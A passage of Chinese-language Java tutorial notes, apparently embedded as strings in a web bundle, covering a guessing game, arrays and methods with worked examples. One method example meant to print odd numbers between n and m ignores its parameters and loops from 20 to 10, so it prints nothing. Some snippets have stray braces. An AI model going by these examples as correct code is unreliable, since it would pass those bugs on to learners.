break结束.\r\n\r\n\t*/\r\n\tpublic static void main(String[] args){\r\n\t\t// 1. 准备Random和Scanner对象, 分别用于产生随机数和键盘录入\r\n\t\tRandom r = new Random();\r\n\t\tScanner sc = new Scanner(System.in);\r\n\t\t// 2. 使用Random产生一个1-100之间的数, 作为要猜的数\r\n\t\tint randomNum = r.nextInt(100) + 1;\r\n\t\t\r\n\t\t// 5. 以上内容需要多次进行, 但无法预估用户输入几次可以猜测正确, 使用while(true)死循环包裹\r\n\t\twhile(true){\r\n\t\t\t// 3. 键盘录入用户猜的的数据\r\n\t\t\tSystem.out.println("请输入您猜的数据:");\r\n\t\t\tint num = sc.nextInt();\r\n\t\t\t// 4. 使用录入的数据(用户猜的数据)和随机数(要猜的数据)进行比较, 并给出提示\r\n\t\t\tif(num > randomNum){\r\n\t\t\t\tSystem.out.println("猜大了");\r\n\t\t\t}else if(num < randomNum){\r\n\t\t\t\tSystem.out.println("猜小了");\r\n\t\t\t}else{\r\n\t\t\t\t// 6. 猜对之后, break结束.\r\n\t\t\t\tSystem.out.println("恭喜,猜中了");\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tSystem.out.println("感谢您的使用");\r\n\t\t\r\n\t}\r\n}\r\n```\r\n\r\n',y='## 第一部分 : IDEA开发工具\r\n\r\n**参见 ：IEDA的安装请参考文件夹PPT中的 04_IDEA.ppt**\r\n\r\n## 1.数组\r\n\r\n### 1.1 数组介绍\r\n\r\n​\t数组就是存储数据长度固定的容器，存储多个数据的数据类型要一致。 \r\n\r\n### 1.2 数组的定义格式\r\n\r\n#### 1.2.1 第一种格式\r\n\r\n​\t数据类型[] 数组名\r\n\r\n​\t示例：\r\n\r\n```java\r\nint[] arr;        \r\ndouble[] arr;      \r\nchar[] arr;\r\n```\r\n\r\n#### 1.2.2 第二种格式\r\n\r\n​\t数据类型 数组名[]\r\n\r\n​\t示例：\r\n\r\n```java\r\nint arr[];\r\ndouble arr[];\r\nchar arr[];\r\n```\r\n\r\n### 1.3 数组的动态初始化\r\n\r\n#### 1.3.1 什么是动态初始化\r\n\r\n​\t数组动态初始化就是只给定数组的长度，由系统给出默认初始化值\r\n\r\n#### 1.3.2 动态初始化格式\r\n\r\n```java\r\n数据类型[] 数组名 = new 数据类型[数组长度];\r\n```\r\n\r\n```java\r\nint[] arr = new int[3];\r\n```\r\n\r\n#### 1.3.3 动态初始化格式详解\r\n\r\n- 等号左边：\r\n\r\n  -  int:数组的数据类型\r\n\r\n  -  []:代表这是一个数组\r\n\r\n  -   arr:代表数组的名称\r\n\r\n- 等号右边：\r\n\r\n    -   new:为数组开辟内存空间\r\n    -   int:数组的数据类型\r\n    -   []:代表这是一个数组\r\n    -   5:代表数组的长度\r\n\r\n**代码 :** \r\n\r\n```java\r\npackage com.itheima.array;\r\n\r\npublic class Demo2Array {\r\n    /*\r\n        数组的动态初始化:\r\n                        在初始化的时候, 需要手动指定数组的长度, 系统会为数组容器分配初始值.\r\n\r\n        动态初始化格式:\r\n                        数据类型[] 数组名 = new 数据类型[数组的长度];\r\n\r\n        注意:\r\n                        打印数组变量的时候, 会打印出数组的内存地址\r\n\r\n        [I@10f87f48 :\r\n\r\n                        @ : 分隔符\r\n                        [ : 当前的空间是一个数组类型\r\n                        I : 当前数组容器中所存储的数据类型\r\n                        10f87f48 : 十六进制内存地址\r\n\r\n                                0 1 2 3 4 5 6 7 8 9 a b c d e f\r\n     */\r\n    public static void main(String[] args) {\r\n        // 数据类型[] 数组名 = new 数据类型[数组的长度];\r\n        // 通过new关键字创建了一个int类型的数组容器, 该容器可以存储5个int类型的整数, 该容器被arr数组变量所记录\r\n        int[] arr = new int[5];\r\n        // [I@10f87f48\r\n        System.out.println(arr);\r\n\r\n        byte[] bArr = new byte[3];\r\n        // [B@b4c966a\r\n        System.out.println(bArr);\r\n\r\n    }\r\n}\r\n\r\n```\r\n\r\n\r\n\r\n### 1.4 数组元素访问\r\n\r\n#### 1.4.1 什么是索引\r\n\r\n​\t每一个存储到数组的元素，都会自动的拥有一个编号，从0开始。\r\n\r\n​\t这个自动编号称为数组索引(index)，可以通过数组的索引访问到数组中的元素。 \t\r\n\r\n#### 1.4.2访问数组元素格式\r\n\r\n```java\r\n数组名[索引];\r\n```\r\n\r\n#### 1.4.3示例代码\r\n\r\n```java\r\npackage com.itheima.array;\r\n\r\npublic class Demo3ArrayIndex {\r\n    /*\r\n        数组动态初始化:\r\n                初始化的时候, 手动指定数组长度, 系统会为数组容器分配初始值.\r\n\r\n        数组的元素访问格式:\r\n                数组名[索引]\r\n\r\n                索引: 数组中数据的编号方式, 编号从0开始\r\n                作用: 访问数组容器中的空间位置\r\n\r\n        注意:\r\n                数组在创建完毕后, 即使没有赋值, 也可以取出, 但取出的元素都是默认初始化值.\r\n\r\n     */\r\n    public static void main(String[] args) {\r\n        int[] arr = new int[3];         // 0 1 2\r\n        System.out.println(arr);        // 数组的内存地址  [I@10f87f48\r\n\r\n        // 数组名[索引]  访问数组容器中的空间位置\r\n        System.out.println(arr[0]);     // 0  系统自动分配的默认初始化值\r\n        System.out.println(arr[1]);\r\n        System.out.println(arr[2]);\r\n\r\n        System.out.println("--------------");\r\n\r\n        // 数组名[索引]\r\n        arr[0] = 11;\r\n        arr[1] = 22;\r\n        arr[2] = 33;\r\n\r\n        System.out.println(arr[0]);\r\n        System.out.println(arr[1]);\r\n        System.out.println(arr[2]);\r\n    }\r\n}\r\n```\r\n\r\n### 1.5 内存分配\r\n\r\n#### 1.5.1 内存概述\r\n\r\n​\t内存是计算机中的重要原件，临时存储区域，作用是运行程序。\r\n\r\n​\t我们编写的程序是存放在硬盘中的，在硬盘中的程序是不会运行的。\r\n\r\n​\t必须放进内存中才能运行，运行完毕后会清空内存。 \r\n\r\n​\tJava虚拟机要运行程序，必须要对内存进行空间的分配和管理。 \r\n\r\n#### 1.5.2 java中的内存分配\r\n\r\n- 目前我们只需要记住两个内存，分别是：栈内存和堆内存\r\n\r\n| 区域名称   | 作用                                                       |\r\n| ---------- | ---------------------------------------------------------- |\r\n| 寄存器     | 给CPU使用，和我们开发无关。                                |\r\n| 本地方法栈 | JVM在使用操作系统功能的时候使用，和我们开发无关。          |\r\n| 方法区     | 存储可以运行的class文件。                                  |\r\n| 堆内存     | 存储对象或者数组，new来创建的，都存储在堆内存。            |\r\n| 方法栈     | 方法运行时使用的内存，比如main方法运行，进入方法栈中执行。 |\r\n\r\n### 1.6 Java内存分配-一个数组内存图\r\n\r\n![1591007817165](./img/java/basics/day04-IDEA&数组.img/1591007817165.png)\r\n\r\n### 1.7 两个数组内存图\r\n\r\n![1591007925899](./img/java/basics/day04-IDEA&数组.img/1591007925899.png)\r\n\r\n### 1.8 多个数组指向相同内存图\r\n\r\n![1591007957052](./img/java/basics/day04-IDEA&数组.img/1591007957052.png)\r\n\r\n### 1.9 数组的静态初始化\r\n\r\n#### 1.9.1 什么是静态初始化\r\n\r\n​\t在创建数组时，直接将元素确定\t\r\n\r\n#### 1.9.2 静态初始化格式\r\n\r\n- 完整版格式\r\n\r\n  ```java\r\n  数据类型[] 数组名 = new 数据类型[]{元素1,元素2,...};\r\n  ```\r\n\r\n- 简化版格式\r\n\r\n  ```java\r\n  数据类型[] 数组名 = {元素1,元素2,...};\r\n  ```\r\n\r\n#### 1.9.3示例代码\r\n\r\n```java\r\npackage com.itheima.array2;\r\n\r\npublic class Demo1Array {\r\n    /*\r\n        数组静态初始化 : 初始化时指定每个数组元素的初始值，由系统决定数组长度\r\n\r\n        完整格式:\r\n                    数据类型[] 数组名 = new 数据类型[]{数据1,数据2,数据3...};\r\n        简化格式:\r\n                    数据类型[] 数组名 = {数据1,数据2,数据3...};\r\n     */\r\n    public static void main(String[] args) {\r\n        // 数据类型[] 数组名 = new 数据类型[]{数据1,数据2,数据3...};\r\n        int[] arr = new int[]{11,22,33};\r\n        System.out.println(arr[0]);\r\n        System.out.println(arr[1]);\r\n        System.out.println(arr[2]);\r\n\r\n        // 数据类型[] 数组名 = {数据1,数据2,数据3...};\r\n        int[] arr2 = {44,55,66};\r\n        System.out.println(arr2);\r\n        System.out.println(arr2[0]);\r\n        System.out.println(arr2[1]);\r\n        System.out.println(arr2[2]);\r\n\r\n    }\r\n}\r\n```\r\n\r\n### 1.10 数组操作的两个常见问题\r\n\r\n#### 1.10.1 索引越界异常\r\n\r\n- 出现原因\r\n\r\n  ```java\r\n  public class ArrayDemo {\r\n      public static void main(String[] args) {\r\n          int[] arr = new int[3];\r\n          System.out.println(arr[3]);\r\n      }\r\n  }\r\n  ```\r\n\r\n  数组长度为3，索引范围是0~2，但是我们却访问了一个3的索引。\r\n\r\n  程序运行后，将会抛出ArrayIndexOutOfBoundsException 数组越界异常。在开发中，数组的越界异常是不能出现的，一旦出现了，就必须要修改我们编写的代码。 \r\n\r\n- 解决方案\r\n\r\n  将错误的索引修改为正确的索引范围即可！\r\n\r\n#### 1.10.2 空指针异常\r\n\r\n- 出现原因\r\n\r\n  ```java\r\n  public class ArrayDemo {\r\n      public static void main(String[] args) {\r\n          int[] arr = new int[3];\r\n  \r\n          //把null赋值给数组\r\n          arr = null;\r\n          System.out.println(arr[0]);\r\n      }\r\n  }\r\n  ```\r\n\r\n  arr = null 这行代码，意味着变量arr将不会在保存数组的内存地址，也就不允许再操作数组了，因此运行的时候会抛出 NullPointerException 空指针异常。在开发中，空指针异常是不能出现的，一旦出现了，就必须要修改我们编写的代码。\r\n\r\n- 解决方案\r\n\r\n  给数组一个真正的堆内存空间引用即可！\r\n\r\n### 1.11 数组遍历\r\n\r\n- 数组遍历：就是将数组中的每个元素分别获取出来，就是遍历。遍历也是数组操作中的基石。\r\n\r\n  ```java\r\n  public class ArrayTest01 {\r\n  \tpublic static void main(String[] args) {\r\n  \t\tint[] arr = { 1, 2, 3, 4, 5 };\r\n  \t\tSystem.out.println(arr[0]);\r\n  \t\tSystem.out.println(arr[1]);\r\n  \t\tSystem.out.println(arr[2]);\r\n  \t\tSystem.out.println(arr[3]);\r\n  \t\tSystem.out.println(arr[4]);\r\n  \t}\r\n  }\r\n  ```\r\n\r\n   以上代码是可以将数组中每个元素全部遍历出来，但是如果数组元素非常多，这种写法肯定不行，因此我们需要改造成循环的写法。数组的索引是 0 到 lenght-1 ，可以作为循环的条件出现。 \r\n\r\n  ```java\r\n  public class ArrayTest01 {\r\n      public static void main(String[] args) {\r\n          //定义数组\r\n          int[] arr = {11, 22, 33, 44, 55};\r\n  \r\n          //使用通用的遍历格式\r\n          for(int x=0; x<arr.length; x++) {\r\n              System.out.println(arr[x]);\r\n          }\r\n      }\r\n  }\r\n  ```\r\n\r\n### 1.12 数组获取最大值\r\n\r\n- 最大值获取：从数组的所有元素中找出最大值。\r\n\r\n- 实现思路：\r\n\r\n  - 定义变量，保存数组0索引上的元素\r\n  - 遍历数组，获取出数组中的每个元素\r\n  - 将遍历到的元素和保存数组0索引上值的变量进行比较\r\n  - 如果数组元素的值大于了变量的值，变量记录住新的值\r\n  - 数组循环遍历结束，变量保存的就是数组中的最大值 \r\n\r\n- 代码实现：\r\n\r\n  ```java\r\n  package com.itheima.test;\r\n  \r\n  import java.util.Scanner;\r\n  \r\n  public class Test2Array {\r\n      /*\r\n          需求: 从数组中查找最大值\r\n  \r\n                  int[] arr = {12,45,98,73,60};\r\n  \r\n          实现步骤:\r\n                  1. 假设数组中的第一个元素为最大值\r\n                  2. 遍历数组, 获取每一个元素, 准备进行比较\r\n                  3. 如果比较的过程中, 出现了比max更大的, 让max记录更大的值\r\n                  4. 循环结束后, 打印最大值.\r\n       */\r\n      public static void main(String[] args) {\r\n          int[] arr = {12,45,98,73,60};\r\n          // 1. 假设数组中的第一个元素为最大值\r\n          int max = arr[0];\r\n          // 2. 遍历数组, 获取每一个元素, 准备进行比较\r\n          for(int i = 1; i < arr.length; i++){\r\n              // 3. 如果比较的过程中, 出现了比max更大的, 让max记录更大的值\r\n              if(arr[i] > max){\r\n                  max = arr[i];\r\n              }\r\n          }\r\n          //  4. 循环结束后, 打印最大值.\r\n          System.out.println("max:" + max);\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n### 1.13 数组元素求和\r\n\r\n- 需求：键盘录入5个整数，存储到数组中，并对数组求和\r\n\r\n- 思路：\r\n      1.创建键盘录入对象，准备键盘录入\r\n      2.定义一个求和变量，准备记录累加后的结果\r\n      3.动态初始化一个长度为5的int数组，准备存储键盘录入的数值\r\n      4.将键盘录入的数值存储到数组中\r\n      5.遍历数组，取出每一个元素，并求和\r\n      6.输出总和\r\n\r\n- 代码实现：\r\n\r\n  ```java\r\n  package com.itheima.test;\r\n  \r\n  import java.util.Scanner;\r\n  \r\n  public class Test3Array {\r\n      /*\r\n          需求：键盘录入5个整数，存储到数组中，并对数组求和\r\n  \r\n          思路：\r\n              1.创建键盘录入对象，准备键盘录入\r\n              2.定义一个求和变量，准备记录累加后的结果\r\n              3.动态初始化一个长度为5的int数组，准备存储键盘录入的数值\r\n              4.将键盘录入的数值存储到数组中\r\n              5.遍历数组，取出每一个元素，并求和\r\n              6.输出总和\r\n       */\r\n      public static void main(String[] args) {\r\n          // 1.创建键盘录入对象，准备键盘录入\r\n          Scanner sc = new Scanner(System.in);\r\n          // 2.定义一个求和变量，准备记录累加后的结果\r\n          int sum = 0;\r\n          // 3.动态初始化一个长度为5的int数组，准备存储键盘录入的数值\r\n          int[] arr = new int[5];\r\n          // 4.将键盘录入的数值存储到数组中\r\n          for(int i = 0; i < arr.length; i++){\r\n              System.out.println("请输入第" + (i+1) + "个整数:");\r\n              //arr[i] = 10;\r\n              arr[i] = sc.nextInt();\r\n          }\r\n  \r\n          // 5.遍历数组，取出每一个元素，并求和\r\n          for (int i = 0; i < arr.length; i++) {\r\n              sum += arr[i];\r\n          }\r\n  \r\n          // 6.输出总和\r\n          System.out.println("sum:" + sum);\r\n  \r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n### 1.14 数组基本查找【应用】\r\n\r\n- 需求：\r\n              已知一个数组 arr = {19, 28, 37, 46, 50}; 键盘录入一个数据，查找该数据在数组中的索引，并在控\r\n              制台输出找到的索引值。\r\n\r\n- 思路：\r\n          1.定义一个数组，用静态初始化完成数组元素的初始化\r\n          2.键盘录入要查找的数据，用一个变量接收\r\n          3.定义一个索引变量，初始值为-1\r\n          4.遍历数组，获取到数组中的每一个元素\r\n          5.拿键盘录入的数据和数组中的每一个元素进行比较，如果值相同，就把该值对应的索引赋值给索引变量，并结束循环\r\n          6.输出索引变量\r\n\r\n- 代码实现：\r\n\r\n  ```java\r\n  public static void main(String[] args) {\r\n          // 1.定义一个数组，用静态初始化完成数组元素的初始化\r\n          int[] arr = {19, 28, 37, 46, 50};\r\n          // 2.键盘录入要查找的数据，用一个变量接收\r\n          Scanner sc = new Scanner(System.in);\r\n          System.out.println("请输入您要查找的元素:");\r\n          int num = sc.nextInt();\r\n          // 3.定义一个索引变量，初始值为-1\r\n          // 假设要查找的数据, 在数组中就是不存在的\r\n          int index = -1;\r\n          // 4.遍历数组，获取到数组中的每一个元素\r\n          for (int i = 0; i < arr.length; i++) {\r\n              // 5.拿键盘录入的数据和数组中的每一个元素进行比较，如果值相同，就把该值对应的索引赋值给索引变量，并结束循环\r\n              if(num == arr[i]){\r\n                  // 如果值相同，就把该值对应的索引赋值给索引变量，并结束循环\r\n                  index = i;\r\n                  break;\r\n              }\r\n          }\r\n          //  6.输出索引变量\r\n          System.out.println(index);\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n### 1.15 评委打分【应用】\r\n\r\n-   需求：在编程竞赛中，有6个评委为参赛的选手打分，分数为0-100的整数分。\r\n                  选手的最后得分为：去掉一个最高分和一个最低分后 的4个评委平均值 (不考虑小数部分)。\r\n\r\n- 思路：\r\n          1.定义一个数组，用动态初始化完成数组元素的初始化，长度为6\r\n          2.键盘录入评委分数\r\n          3.由于是6个评委打分，所以，接收评委分数的操作，用循环\r\n          4.求出数组最大值\r\n          5.求出数组最小值\r\n          6.求出数组总和\r\n          7.按照计算规则进行计算得到平均分\r\n          8.输出平均分\r\n\r\n- 代码实现：\r\n\r\n  ```java\r\n      public static void main(String[] args) {\r\n          // 1.定义一个数组，用动态初始化完成数组元素的初始化，长度为6\r\n          int[] arr = new int[6];\r\n          // 2.键盘录入评委分数\r\n          Scanner sc = new Scanner(System.in);\r\n          //  3.由于是6个评委打分，所以，接收评委分数的操作，用循环\r\n          for (int i = 0; i < arr.length; i++) {\r\n              System.out.println("请输入第" + (i+1) + "个评委的打分:");\r\n              int score = sc.nextInt();\r\n              if(score >= 0 && score <= 100){\r\n                  // 合法的分值\r\n                  arr[i] = score;\r\n              }else{\r\n                  // 非法的分值\r\n                  System.out.println("您的打分输入有误, 请检查是否是0-100之间的");\r\n                  i--;\r\n              }\r\n          }\r\n  \r\n          // 4.求出数组最大值\r\n          int max = arr[0];\r\n          for (int i = 1; i < arr.length; i++) {\r\n              if(max < arr[i]){\r\n                  max = arr[i];\r\n              }\r\n          }\r\n  \r\n          // 5.求出数组最小值\r\n          int min = arr[0];\r\n          for (int i = 1; i < arr.length; i++) {\r\n              if(min > arr[i]){\r\n                  min = arr[i];\r\n              }\r\n          }\r\n  \r\n          // 6.求出数组总和\r\n          int sum = 0;\r\n          for (int i = 0; i < arr.length; i++) {\r\n              sum += arr[i];\r\n          }\r\n  \r\n          // 7.按照计算规则进行计算得到平均分\r\n          int avg = (sum - max - min ) / 4;\r\n  \r\n          // 8.输出平均分\r\n          System.out.println(avg);\r\n      }\r\n  }\r\n  ```\r\n\r\n',f='## 1. 方法概述\r\n\r\n### 1.1 方法的概念\r\n\r\n​\t方法（method）是将具有独立功能的代码块组织成为一个整体，使其具有特殊功能的代码集\r\n\r\n* 注意：\r\n  * 方法必须先创建才可以使用，该过程成为方法定义\r\n  * 方法创建后并不是直接可以运行的，需要手动使用后，才执行，该过程成为方法调用\r\n\r\n## 2. 方法的定义和调用\r\n\r\n### 2.1 无参数方法定义和调用\r\n\r\n* 定义格式：\r\n\r\n  ```java\r\n  public static void 方法名 (   ) {\r\n  \t// 方法体;\r\n  }\r\n  ```\r\n\r\n* 范例：\r\n\r\n  ```java\r\n  public static void method (    ) {\r\n  \t// 方法体;\r\n  }\r\n  ```\r\n\r\n* 调用格式：\r\n\r\n  ```java\r\n  方法名();\r\n  ```\r\n\r\n* 范例：\r\n\r\n  ```java\r\n  method();\r\n  ```\r\n\r\n* 注意：\r\n\r\n  ​\t方法必须先定义，后调用，否则程序将报错\r\n\r\n### 2.2 方法的调用过程\r\n\r\n* 总结：每个方法在被调用执行的时候，都会进入栈内存，并且拥有自己独立的内存空间，方法内部代码调用完毕之后，会从栈内存中弹栈消失。\r\n\r\n  \r\n\r\n### 2.3 方法练习-奇偶数判断\r\n\r\n* 需求：判断一个数是奇数还是偶数\r\n* 代码：\r\n\r\n```java\r\npublic class Demo1Method {\r\n    /*\r\n\r\n        带参数方法的定义格式:\r\n                public static void 方法名  ( 参数 )  { … … }\r\n                public static void 方法名  ( 数据类型 变量名 )  { … … }\r\n\r\n        带参数方法的调用格式:\r\n                方法名 ( 参数 ) ;\r\n                方法名 ( 变量名/常量值 ) ;\r\n\r\n        tips: 参数可以是一个, 也可以是多个.\r\n\r\n        需求: 判断一个数是奇数还是偶数\r\n     */\r\n    public static void main(String[] args) {\r\n        isEvenNumber(10);\r\n    }\r\n\r\n    public static void isEvenNumber(int num){\r\n        if(num % 2 == 0){\r\n            System.out.println("偶数");\r\n        }else{\r\n            System.out.println("奇数");\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n## 3. 带参数方法的定义和调用\r\n\r\n### 3.1 带参数方法定义和调用\r\n\r\n* 定义格式：\r\n\r\n  参数：由数据类型和变量名组成 -  数据类型 变量名\r\n\r\n  参数范例：int a\r\n\r\n  ```java\r\n  public static void 方法名 (参数1) {\r\n  \t方法体;\r\n  }\r\n  \r\n  public static void 方法名 (参数1, 参数2, 参数3...) {\r\n  \t方法体;\r\n  }\r\n  ```\r\n\r\n* 范例：\r\n\r\n  ```java\r\n  public static void isEvenNumber(int number){\r\n      ...\r\n  }\r\n  public static void getMax(int num1, int num2){\r\n      ...\r\n  }\r\n  ```\r\n\r\n  * 注意：\r\n\r\n  \t\t方法定义时，参数中的数据类型与变量名都不能缺少，缺少任意一个程序将报错\r\n\r\n  \t\t方法定义时，多个参数之间使用逗号( ，)分隔\r\n\r\n* 调用格式：\r\n\r\n  ```java\r\n  方法名(参数)；\r\n  \r\n  方法名(参数1,参数2);\r\n  ```\r\n\r\n* 范例：\r\n\r\n  ```java\r\n  isEvenNumber(10);\r\n  \r\n  getMax(10,20);\r\n  ```\r\n\r\n  * 方法调用时，参数的数量与类型必须与方法定义中的设置相匹配，否则程序将报错 \r\n\r\n### 3.2 形参和实参\r\n\r\n1. 形参：方法定义中的参数\r\n\r\n​          等同于变量定义格式，例如：int number\r\n\r\n2. 实参：方法调用中的参数\r\n\r\n​          等同于使用变量或常量，例如： 10  number\r\n\r\n### 3.3 带参数方法的练习-打印n-m之间所有的奇数\r\n\r\n* 需求：设计一个方法（print） 用于打印 n 到 m 之间所有的奇数\r\n* 思路：\r\n\r\n  ​\t1：定义方法，名称为print\r\n          2：为方法添加两个int类型的形参，准备接受调用者传递过来的实参\r\n          3：方法中设计for循环，循环从n开始，到m结束\r\n          4：循环中加入if判断，是奇数，则打印\r\n          5：main方法中调用print方法，传入两个实际参数\r\n* 代码：\r\n\r\n```java\r\npackage com.itheima.method2;\r\n\r\npublic class Demo2Method {\r\n    public static void main(String[] args) {\r\n        // 5：main方法中调用print方法，传入两个实际参数\r\n        print(20,10);\r\n    }\r\n\r\n    //1：定义方法，名称为print\r\n    // 2：为方法添加两个int类型的形参，准备接受调用者传递过来的实参\r\n    public static void print(int n, int m){\r\n        System.out.println(n + "到" + m + "之间的奇数为:");\r\n        // 3：方法中设计for循环，循环从n开始，到m结束\r\n        for(int i = 20; i <= 10; i++){\r\n            // 4：循环中加入if判断，是奇数，则打印\r\n            if(i % 2 == 1){\r\n                System.out.println(i);\r\n            }\r\n        }\r\n    }\r\n\r\n}\r\n```\r\n\r\n## 4. 带返回值方法的定义和调用\r\n\r\n### 4.1 带返回值方法定义和调用（掌握）\r\n\r\n* 定义格式\r\n\r\n  ```java\r\n  public static 数据类型 方法名 ( 参数 ) { \r\n  \treturn 数据 ;\r\n  }\r\n  ```\r\n\r\n* 范例\r\n\r\n  ```java\r\n  public static boolean isEvenNumber( int number ) {           \r\n  \treturn true ;\r\n  }\r\n  public static int getMax( int a, int b ) {\r\n  \treturn  100 ;\r\n  }\r\n  ```\r\n\r\n  * 注意：\r\n    * 方法定义时return后面的返回值与方法定义上的数据类型要匹配，否则程序将报错\r\n\r\n* 调用格式\r\n\r\n  ```java\r\n  方法名 ( 参数 ) ;\r\n  数据类型 变量名 = 方法名 ( 参数 ) ;\r\n  ```\r\n\r\n* 范例\r\n\r\n  ```java\r\n  isEvenNumber ( 5 ) ;\r\n  boolean  flag =  isEvenNumber ( 5 ); \r\n  ```\r\n\r\n  * 注意：\r\n    * 方法的返回值通常会使用变量接收，否则该返回值将无意义\r\n\r\n### 4.2 带返回值方法的练习-求两个数的最大值(应用)\r\n\r\n* 需求：设计一个方法可以获取两个数的较大值，数据来自于参数\r\n\r\n* 思路：\r\n\r\n  1. 定义一个方法，声明两个形参接收计算的数值，求出结果并返回\r\n  2. 使用 if 语句 得出 a 和 b 之间的最大值，根据情况return具体结果\r\n  3. 在main()方法中调用定义好的方法并使用 【 变量保存 】\r\n\r\n* 代码：\r\n\r\n  ```java\r\n   /*\r\n          需求：设计一个方法可以获取两个数的较大值，数据来自于参数\r\n  \r\n          1. 定义一个方法，声明两个形参接收计算的数值，求出结果并返回\r\n          2. 使用 if 语句 得出 a 和 b 之间的最大值，根据情况return具体结果\r\n          3. 在main()方法中调用定义好的方法并使用 【 变量保存 】\r\n       */\r\n      public static void main(String[] args) {\r\n          // 3. 在main()方法中调用定义好的方法并使用 【 变量保存 】\r\n          System.out.println(getMax(10,20));  // 输出调用\r\n  \r\n          int result = getMax(10,20);\r\n          System.out.println(result);\r\n  \r\n          for(int i = 1; i <= result; i++){\r\n              System.out.println("HelloWorld");\r\n          }\r\n  \r\n      }\r\n  \r\n      // 方法可以获取两个数的较大值\r\n      public static int getMax(int a, int b){\r\n          if(a > b){\r\n              return a;\r\n          }else{\r\n              return b;\r\n          }\r\n      }\r\n  \r\n  }\r\n  \r\n  ```\r\n\r\n## 5. 方法的注意事项\r\n\r\n### 5.1 方法的通用格式（掌握）\r\n\r\n- 格式：\r\n\r\n  ```java\r\n  public static 返回值类型 方法名(参数) {\r\n     方法体; \r\n     return 数据 ;\r\n  }\r\n  ```\r\n\r\n- 解释：\r\n\r\n  - public static \t修饰符，目前先记住这个格式\r\n\r\n    返回值类型\t方法操作完毕之后返回的数据的数据类型\r\n\r\n    ​\t\t\t如果方法操作完毕，没有数据返回，这里写void，而且方法体中一般不写return\r\n\r\n     方法名\t\t调用方法时候使用的标识\r\n\r\n     参数\t\t由数据类型和变量名组成，多个参数之间用逗号隔开\r\n\r\n     方法体\t\t完成功能的代码块\r\n\r\n     return\t\t如果方法操作完毕，有数据返回，用于把数据返回给调用者\r\n\r\n- 定义方法时，要做到两个明确\r\n\r\n  - 明确返回值类型：主要是明确方法操作完毕之后是否有数据返回，如果没有，写void；如果有，写对应的数据类型\r\n  - 明确参数：主要是明确参数的类型和数量\r\n\r\n- 调用方法时的注意：\r\n\r\n  - void类型的方法，直接调用即可\r\n  - 非void类型的方法，推荐用变量接收调用\r\n\r\n\r\n\r\n### 5.2 方法的注意事项\r\n\r\n* 方法不能嵌套定义\r\n\r\n  * 示例代码：\r\n\r\n    ```java\r\n    public class MethodDemo {\r\n        public static void main(String[] args) {\r\n    \r\n        }\r\n    \r\n        public static void methodOne() {\r\n    \t\tpublic static void methodTwo() {\r\n           \t\t// 这里会引发编译错误!!!\r\n        \t}\r\n        }\r\n    }\r\n    ```\r\n\r\n* void表示无返回值，可以省略return，也可以单独的书写return，后面不加数据\r\n\r\n  * 示例代码：\r\n\r\n    ```java\r\n    public class MethodDemo {\r\n        public static void main(String[] args) {\r\n    \r\n        }\r\n        public static void methodTwo() {\r\n            //return 100; 编译错误，因为没有具体返回值类型\r\n            return;\t\r\n            //System.out.println(100); return语句后面不能跟数据或代码\r\n        }\r\n    }\r\n    ```\r\n\r\n## 6. 方法重载\r\n\r\n### 6.1 方法重载\r\n\r\n* 方法重载概念\r\n\r\n  方法重载指同一个类中定义的多个方法之间的关系，满足下列条件的多个方法相互构成重载\r\n\r\n  * 多个方法在同一个类中\r\n  * 多个方法具有相同的方法名\r\n  * 多个方法的参数不相同，类型不同或者数量不同\r\n\r\n* 注意：\r\n\r\n  * 重载仅对应方法的定义，与方法的调用无关，调用方式参照标准格式\r\n  * 重载仅针对同一个类中方法的名称与参数进行识别，与返回值无关，换句话说不能通过返回值来判定两个方法是否相互构成重载\r\n\r\n* 正确范例：\r\n\r\n  ```java\r\n  public class MethodDemo {\r\n  \tpublic static void fn(int a) {\r\n      \t//方法体\r\n      }\r\n      public static int fn(double a) {\r\n      \t//方法体\r\n      }\r\n  }\r\n  \r\n  public class MethodDemo {\r\n  \tpublic static float fn(int a) {\r\n      \t//方法体\r\n      }\r\n      public static int fn(int a , int b) {\r\n      \t//方法体\r\n      }\r\n  }\r\n  ```\r\n\r\n* 错误范例：\r\n\r\n  ```java\r\n  public class MethodDemo {\r\n  \tpublic static void fn(int a) {\r\n      \t//方法体\r\n      }\r\n      public static int fn(int a) { \t/*错误原因：重载与返回值无关*/\r\n      \t//方法体\r\n      }\r\n  }\r\n  \r\n  public class MethodDemo01 {\r\n      public static void fn(int a) {\r\n          //方法体\r\n      }\r\n  } \r\n  public class MethodDemo02 {\r\n      public static int fn(double a) { /*错误原因：这是两个类的两个fn方法*/\r\n          //方法体\r\n      }\r\n  }\r\n  ```\r\n\r\n### 6.2 方法重载练习\r\n\r\n* 需求：使用方法重载的思想，设计比较两个整数是否相同的方法，兼容全整数类型（byte,short,int,long） \r\n\r\n* 思路：\r\n\r\n  ​\t①定义比较两个数字的是否相同的方法compare()方法，参数选择两个int型参数\r\n\r\n  ​\t②定义对应的重载方法，变更对应的参数类型，参数变更为两个long型参数\r\n\r\n  ​\t③定义所有的重载方法，两个byte类型与两个short类型参数 \r\n\r\n  ​\t④完成方法的调用，测试运行结果 \r\n\r\n* 代码：\r\n\r\n  ```java\r\n  public class MethodTest {\r\n      public static void main(String[] args) {\r\n          //调用方法\r\n          System.out.println(compare(10, 20));\r\n          System.out.println(compare((byte) 10, (byte) 20));\r\n          System.out.println(compare((short) 10, (short) 20));\r\n          System.out.println(compare(10L, 20L));\r\n      }\r\n  \r\n      //int\r\n      public static boolean compare(int a, int b) {\r\n          System.out.println("int");\r\n          return a == b;\r\n      }\r\n  \r\n      //byte\r\n      public static boolean compare(byte a, byte b) {\r\n          System.out.println("byte");\r\n          return a == b;\r\n      }\r\n  \r\n      //short\r\n      public static boolean compare(short a, short b) {\r\n          System.out.println("short");\r\n          return a == b;\r\n      }\r\n  \r\n      //long\r\n      public static boolean compare(long a, long b) {\r\n          System.out.println("long");\r\n          return a == b;\r\n      }\r\n  \r\n  }\r\n  ```\r\n\r\n## 7. 方法的参数传递\r\n\r\n### 7.1 方法参数传递基本类型（理解）\r\n\r\n* 测试代码：\r\n\r\n  ```java\r\n  package com.itheima.param;\r\n  \r\n  public class Test1 {\r\n      /*\r\n           方法参数传递为基本数据类型 :\r\n  \r\n                  传入方法中的, 是具体的数值.\r\n       */\r\n      public static void main(String[] args) {\r\n          int number = 100;\r\n          